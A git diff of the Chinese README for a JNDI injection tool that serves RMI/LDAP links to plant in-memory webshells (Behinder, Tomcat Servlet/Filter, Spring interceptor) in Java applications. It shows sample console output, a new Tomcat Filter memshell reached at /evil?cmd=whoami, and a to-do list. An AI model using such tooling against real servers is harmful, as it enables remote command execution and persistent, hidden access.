@@ -17,32 +17,35 @@ JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于
 $ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar          
 [ADDRESS] >> 127.0.0.1
 [COMMAND] >> open -a Calculator
-----------------------------JNDI Links----------------------------
-Target environment(Behinder Servlet Memshell):
-rmi://127.0.0.1:1099/j3zha7
-ldap://127.0.0.1:1389/j3zha7
-Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/qrxwmq
-ldap://127.0.0.1:1389/qrxwmq
-Target environment(Springboot Interceptor Memshell):
-rmi://127.0.0.1:1099/i7ukcl
-ldap://127.0.0.1:1389/i7ukcl
-Target environment(Springboot Interceptor Behinder Memshell):
-rmi://127.0.0.1:1099/wxzn7u
-ldap://127.0.0.1:1389/wxzn7u
-Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/hrrq2s
-ldap://127.0.0.1:1389/hrrq2s
+----------------------------JNDI Links---------------------------- 
 Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
-rmi://127.0.0.1:1099/djodn7
+rmi://127.0.0.1:1099/svbmvr
+Target environment(Springboot Interceptor Behinder Memshell):
+rmi://127.0.0.1:1099/wf0teg
+ldap://127.0.0.1:1389/wf0teg
+Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/dsedk6
+ldap://127.0.0.1:1389/dsedk6
+Target environment(Behinder Servlet Memshell):
+rmi://127.0.0.1:1099/b3uiqm
+ldap://127.0.0.1:1389/b3uiqm
+Target environment(Springboot Interceptor Memshell):
+rmi://127.0.0.1:1099/2druq8
+ldap://127.0.0.1:1389/2druq8
+Target environment(Tomcat Filter Memshell):
+rmi://127.0.0.1:1099/h4bsck
+ldap://127.0.0.1:1389/h4bsck
+Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/6pvnje
+ldap://127.0.0.1:1389/6pvnje
 Target environment(Tomcat Servlet Memshell):
-rmi://127.0.0.1:1099/xmw45d
-ldap://127.0.0.1:1389/xmw45d
+rmi://127.0.0.1:1099/moasws
+ldap://127.0.0.1:1389/moasws
 
 ----------------------------Server Log----------------------------
-2023-08-28 15:04:30 [JETTYSERVER]>> Listening on 0.0.0.0:8180
-2023-08-28 15:04:30 [RMISERVER]  >> Listening on 0.0.0.0:1099
-2023-08-28 15:04:30 [LDAPSERVER] >> Listening on 0.0.0.0:1389
+2023-08-29 12:34:05 [JETTYSERVER]>> Listening on 0.0.0.0:8180
+2023-08-29 12:34:05 [RMISERVER]  >> Listening on 0.0.0.0:1099
+2023-08-29 12:34:06 [LDAPSERVER] >> Listening on 0.0.0.0:1389
 ```
 
 - Tomcat Servlet Memshell
@@ -68,6 +71,8 @@ ldap://127.0.0.1:1389/xmw45d
 	
 	​	![ ](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/4.jpg)
 
+- Tomcat Filter Memshell:
+  - Tomcat filter内存马，在访问路径/evil?cmd=whoami，可以执行命令
 
 
 ## Tips:
@@ -78,7 +83,7 @@ A:如果服务端存在拦截器，指定如果未登录的状态除了/login接
 
 ## 待实现
 
-- 添加filter、~~Interceptor~~类型的内存马。
+- 添加~~filter~~、~~Interceptor~~类型的内存马。
 - 融合groovy的bypass利用链到项目中。
 - 更新weblogic以及其他中间件的内存马注入环境
 - 增加注入哥斯拉内存马的模块
